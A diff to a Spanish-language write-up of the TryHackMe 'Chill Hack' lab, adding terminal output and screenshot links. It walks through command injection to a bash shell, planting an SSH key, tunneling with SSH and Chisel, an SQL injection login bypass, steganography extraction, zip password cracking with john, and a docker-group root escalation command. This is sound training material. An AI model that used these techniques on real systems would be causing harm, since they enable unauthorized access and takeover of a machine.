@@ -382,7 +382,7 @@ Hello user! I am test,  Please enter your message: /bin/bash
 
 Aqui le pasamos un nombre cualquiera y como mensaje le pedimos ejecutar una `/bin/bash` y ya teniendo acceso a la bash con usuario apaar, busco para obtener la flag de usuario pedida por TryHackMe.
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_22-40.png)
 
 En este punto, antes habia visto el puerto 9001 abierto pero de forma interna en el local host, por lo que hay dos formas de poder realizar un tunel inverso, ya sea con SSH o usando el binario Chisel y poder ver lo que hay en ese puerto.
 
@@ -396,15 +396,49 @@ Use el binario `ssh-keygen` de Linux para crear las llaves, y el comando que eje
 ssh-keygen -f <name_file>
 ```
 
-- imagen
+```
+> ssh-keygen -f id_rsa
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in id_rsa
+Your public key has been saved in id_rsa.pub
+The key fingerprint is:
+SHA256:OAfBMr3t7Yg/4vkK6EzPxe9zNLNSh+FHXtvLS/RcXQ8 cybersecco@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+|     o.          |
+|    o o.         |
+|     o.o      E .|
+|      .o. . . ..+|
+|      o.So = . ++|
+|   . . o. O + o.+|
+|  o . o. = *  ..+|
+| + o ooo= +   .o |
+|  o o.+*==     ..|
++----[SHA256]-----+
+```
 
 Este comando me creo una clave publica y una privada, lo cual la llave publica la copie y la pegue en el archivo `authorized_keys`  que esta alojado en el directorio /.ssh en el directorio del usuario Apaar.
 
-- imagen
+```
+apaar@ubuntu:~/.ssh$ nano authorized_keys 
+apaar@ubuntu:~/.ssh$ cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFUghkYWSLNzrFb0Cj5l1j4hSw8nXpqU3vnyB2f0ST4uVkwWyIuidKj1fSzrpf06XhnNKcTkRo95RQfUy1JYQ6S1PnDxYjHxuLTi/EVbHTjVKurb2T0OxUaUwOTAHPSeZtn482F2KGcTdSx+5DKuZgjx2QwBZ52moMgmaJX12RudyriQHgX5Ks4htO7JaWIRNaW/EJ3HLyS5L1v7WNNFtq+RSo2Bqgc7cGjdgCpJkFd8A4YyMCIRLKXUI0+xo7P+id+qxLD2slsU8OIYoUT86XUdP3/3O0vNUad+Id1a5ccYfpJw3xDQZdZONDRULG/bJn9D6PB2RqcqYgFq0aZpcyPh95weww+1/kWMdHPXmwkvNzB+57zDr1fmNBh2fzmDef8Dt9NnOacVlNVqpeZPVqxue/ZvIVUxYZ5allX8U4YhZTnt6KHVm/4efsY5/nf6XvV2cv6q6IF+lf7Ryr78gUJMGbY3twsDJxnaL0fSh9sam+oMxrNgWRxWxDismPfRU= cybersecco@parrot
+apaar@ubuntu:~/.ssh$ 
+```
 
 A la clave privada que creé le adjunto los permiso `600` con el siguiente comando `chmod 600 <name_file>`.
 
-- imagen
+```
+> chmod 600 id_rsa     
+total 12K
+drwxr-xr-x 1 cybersecco cybersecco   48 ene  9 22:43 .
+drwxr-xr-x 1 cybersecco cybersecco   38 ene  9 10:57 ..
+-rw------- 1 cybersecco cybersecco 2,6K ene  9 22:43 id_rsa
+-rw-r--r-- 1 cybersecco cybersecco  571 ene  9 22:43 id_rsa.pub
+-rw-r--r-- 1 cybersecco cybersecco   90 ene  9 11:00 note.txt
+```
 
 Teniendo esto use el siguiente comando para crear el tunel inverso al puerto que quiero ingresar. aqui el comando que use.
 
@@ -412,11 +446,11 @@ Teniendo esto use el siguiente comando para crear el tunel inverso al puerto que
 ssh -L <port>:127.0.0.1:<port> -i <name_file> <user>@<IP objetivo>
 ```
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_22-54.png)
 
 Ahora pasare abrir el puerto desde la web a ver que hay.
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_22-57.png)
 
 En el puerto interno encontre un panel de control pero no tengo credenciales para acceder a el.
 
@@ -428,37 +462,44 @@ Para usar chisel debo tener dos copias del binario, uno en la maquina objetivo y
 
 Monte un servidor desde mi maquina de atacante.
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_23-08.png)
 
 Ahora monto un cliente desde la maquina objetivo.
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_23-09.png)
 
-Reviso si se da la conexion del lado del servidor.
+Reviso si se da la conexion del lado del servidor y listo por lo tanto pase a revisar tambien la web.
 
-- imagen
-
-Listo por lo tanto pase a revisar tambien la web.
-
-- imagen
+![](/assets/images/chillHack/2023-01-09_22-57.png)
 
 En este punto que vi un panel de inicio de sesion pase a utilizar una tipica injection SQL `' OR 1=1-- -` y una contraseña cualquiera.
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_23-12.png)
 
 Me abrio esta pagina `/hacker.php`.
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_23-13.png)
 
 En este punto me dio una pista, diciendo que mire en la oscuridad, por lo que me causa curiosidad y me descargo la imagen.
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_23-16.png)
 
 ### Steg Hide
 
 Haciendo uso de esta herramienta le pase el parametro info para que me arroje informacion acerca de la imagen y me mostro que hay un archivo .zip por lo que pase a extraerlo de la imagen.
 
-- imagen
+```
+> steghide info hacker-with-laptop_23-2147985341.jpg 
+"hacker-with-laptop_23-2147985341.jpg":
+  formato: jpeg
+  capacidad: 3,6 KB
+Intenta informarse sobre los datos adjuntos? (s/n) s
+Anotar salvoconducto: 
+  archivo adjunto "backup.zip":
+    tamao: 750,0 Byte
+    encriptado: rijndael-128, cbc
+    compactado: si
+```
 
 Y para extraerlo use el siguiente comando:
 
@@ -466,13 +507,13 @@ Y para extraerlo use el siguiente comando:
 steghide extract -sf <name_img>
 ```
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_23-21.png)
 
 Con el comando unzip podemos extraer lo del archivo `.zip`.
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_23-22.png)
 
-Al unzipiar el archivo me pide una contraseña que aun no se por lo que usare la herramienta de jhon para archivos `.zip`.
+Al unzipiar el archivo me pide una contraseña que aun no se, por lo que usare la herramienta de jhon para archivos `.zip`.
 
 Este es el comando que use para generar un hash para luego romper con john y su fuerza bruta.
 
@@ -480,7 +521,11 @@ Este es el comando que use para generar un hash para luego romper con john y su 
 zip2john backup.zip > hash
 ```
 
-- imagen
+```
+> zip2john backup.zip > hash
+Created directory: /home/cybersecco/.john
+ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3
+```
 
 Ahora teniendo ese hash pasare a usar john y mirar con un diccionario de contraseñas a ver si me da la contraseña crakeada. Utilce el siguiente comando de john.
 
@@ -488,29 +533,47 @@ Ahora teniendo ese hash pasare a usar john y mirar con un diccionario de contras
 john <name_hash> --wordlist=<directory_pass>
 ```
 
-- imagen
+```
+> sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+pass1word        (backup.zip/source_code.php)
+1g 0:00:00:00 DONE (2023-01-09 23:27) 100.0g/s 1228Kp/s 1228Kc/s 1228KC/s total90..hawkeye
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+```
 
 Me descomprimio un archivo llamado `source-code.php`, pase a revisarlo y me encuentro con una contraseña en base 64 y el usuario Anurodh.
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_23-31.png)
 
 Decodificamos la contraseña en base64:
 
-- imagen
+```
+> echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d 
+!d0ntKn0wmYp@ssw0rd
+```
 
 Teniendo esto en cuenta pude realizar un movimiento lateral al usuario Anurodh con la contraseña dada.
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_23-35.png)
 
 ## Escalada de privilegios
 
 Efectivamente me pase a otro usuario de esta maquina objetivo por lo que como siempre, lanzo el como id a ver en que grupos se encuentra este usuario.
 
-- imagen
+```
+anurodh@ubuntu:~$ id
+uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+```
 
-Veo que esta en el grupo docker por lo que si esta en esta grupo puedo aprovecharme de este grupo para iniciar una instancia ya que inmediatamente se cargar un chroot, dandome efectivamente una shell con root.
+Veo que esta en el grupo docker por lo que si esta en esta grupo puedo aprovecharme de este grupo para iniciar una instancia ya que inmediatamente se carga un chroot, dandome efectivamente una shell con root.
 
-Haciendo uso de la pagina de https://gtfobins.github.io buscando por docker shell, me muestra el comando para usar y poder generar una shell con usuario Root.
+Haciendo uso de la pagina de https://gtfobins.github.io buscando por docker shell, me muestra el comando para usar y poder generar una shell con usuario root.
 
 ```
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
@@ -518,4 +581,4 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 Y este comando me dio los privilegios de root. 
 
-- imagen
+![](/assets/images/chillHack/2023-01-09_23-41.png)
